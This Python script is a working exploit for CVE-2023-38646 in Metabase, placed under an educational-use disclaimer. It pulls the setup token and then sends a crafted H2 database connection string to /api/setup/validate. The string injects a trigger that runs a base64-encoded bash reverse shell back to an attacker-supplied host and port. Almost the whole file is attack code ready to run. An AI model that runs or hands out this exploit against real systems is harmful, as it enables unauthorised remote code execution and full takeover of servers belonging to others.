"""
/******************************************************************************
* DISCLAIMER: 
* 
* This script is provided for educational and awareness purposes only. It is 
* intended to demonstrate a security vulnerability and should only be used in 
* environments where you have explicit authorization to test for and mitigate 
* such vulnerabilities. Unauthorised use of this script on systems without 
* proper authorization may be illegal and could result in legal consequences. 
* 
* The author of this script are not responsible for any misuse or damage 
* caused by the execution of this code. Use at your own risk.
*
* By using this script, you agree that you have read and understood this 
* disclaimer and assume full responsibility for any actions taken.
******************************************************************************/
"""

import requests
import argparse
import base64

# Function to encode and pad command to base64
def encode_and_pad(cmd):
    # Encode the command
    encoded = base64.b64encode(cmd.encode('ascii')).decode()
    # Count the number of padding characters '='
    equal_count = encoded.count('=')
    # If padding is needed, add extra spaces to the command and encode again
    if equal_count >= 1:
        encoded = base64.b64encode(f'{cmd + " " * equal_count}'.encode('ascii')).decode()
    return encoded

# Create ArgumentParser object
parser = argparse.ArgumentParser(description="CVE-2023-38646")

# Add arguments
parser.add_argument('--url', type=str, required=True, help='URL of the login page')
parser.add_argument('--token', type=str, required=True, help='The setup token from /api/session/properties')
parser.add_argument('--lhost', type=str, required=True, help='Your attacker machine IP')
parser.add_argument('--lport', type=str, required=True, help='Your attacker machine listening port')

# Parse the command-line arguments
args = parser.parse_args()

# Create the full URL
url = args.url + '/api/setup/validate'

# Command that will be executed
cmd = encode_and_pad("bash -i >& /dev/tcp/" + args.lhost + "/" + args.lport + " 0>&1")

headers = {
    'Content-Type': 'application/json'
}

# Retrieve the token:
response = requests.get(args.url + "/api/session/properties", verify=False)
data = response.json()
print(f"             Setup Token: {data['setup-token']}\n")

data = {
    "token": args.token,
    "details": {
        "is_on_demand": False,
        "is_full_sync": False,
        "is_sample": False,
        "cache_ttl": None,
        "refingerprint": False,
        "auto_run_queries": True,
        "schedules": {},
        "details": {
            "db": f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{cmd}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x",
            "advanced-options": False,
            "ssl": True
        },
        "name": "aaa",
        "engine": "h2"
    }
}

print("\nExecuting with URL: " + url)
print("...please wait")

# Make the HTTP POST request
response = requests.post(url, headers=headers, json=data)

print("\nPOST request made!")
print("Make sure you have set up a listening port on your local machine to test effectiveness")
